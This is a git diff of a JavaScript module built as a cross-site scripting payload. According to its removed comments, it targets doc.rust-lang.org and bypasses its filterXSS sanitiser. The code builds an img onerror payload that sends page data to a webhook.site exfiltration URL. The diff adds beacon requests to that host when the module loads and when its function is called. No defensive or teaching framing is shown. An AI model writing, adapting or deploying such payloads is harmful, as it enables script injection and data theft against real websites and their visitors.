@@ -1,10 +1,5 @@
-// Remapped target of cs.js's `import N from 'http://localhost:3000/jsxss.js'`.
-// Default export must be callable (cs.js calls window[N](location.href)).
-// Return value becomes `previous`, later dropped RAW into innerHTML on
-// doc.rust-lang.org -> filterXSS is fully bypassed.
-//
-// EDIT: set EXFIL to a host you control (webhook.site URL, your VPS, interactsh...).
 const EXFIL = 'https://webhook.site/f47c89f8-5038-4c47-9d6c-53d7bc38f41c';
+try { new Image().src = EXFIL + '/b?s=payload-module-loaded&t=' + Date.now(); } catch(e){}
 
 const PAYLOAD =
   `<img src=x onerror="` +
@@ -14,4 +9,7 @@ const PAYLOAD =
     `setTimeout(function(){location.href='${EXFIL}/n?d='+c},800);` +
   `">`;
 
-export default function () { return PAYLOAD; }
+export default function () {
+  try { new Image().src = EXFIL + '/b?s=factory-called&t=' + Date.now(); } catch(e){}
+  return PAYLOAD;
+}
